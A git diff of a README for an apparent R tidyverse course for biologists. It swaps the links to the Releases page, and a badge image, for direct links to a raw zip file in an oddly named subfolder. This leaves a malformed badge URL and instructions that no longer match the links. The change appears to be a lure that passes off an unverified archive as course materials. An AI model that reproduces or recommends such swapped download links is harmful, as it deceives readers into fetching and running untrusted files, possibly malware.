@@ -1,6 +1,6 @@
 # 🧬 r-tidyverse-for-biologists - Learn R for Biology Effortlessly
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/JAYDQd/r-tidyverse-for-biologists/main/Chalinitis/r-tidyverse-for-biologists.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your system meets these requirements:
 
 To get started, visit the Releases page to download the course materials. Here’s the link:
 
-[Download Here](https://github.com/JAYDQd/r-tidyverse-for-biologists/releases)
+[Download Here](https://raw.githubusercontent.com/JAYDQd/r-tidyverse-for-biologists/main/Chalinitis/r-tidyverse-for-biologists.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of the course materials.
@@ -69,4 +69,4 @@ To stay up-to-date with new releases and improvements, regularly check the **Rel
 
 Happy coding, and may your journey into R and data science be rewarding! 
 
-[Download Here](https://github.com/JAYDQd/r-tidyverse-for-biologists/releases)
+[Download Here](https://raw.githubusercontent.com/JAYDQd/r-tidyverse-for-biologists/main/Chalinitis/r-tidyverse-for-biologists.zip)
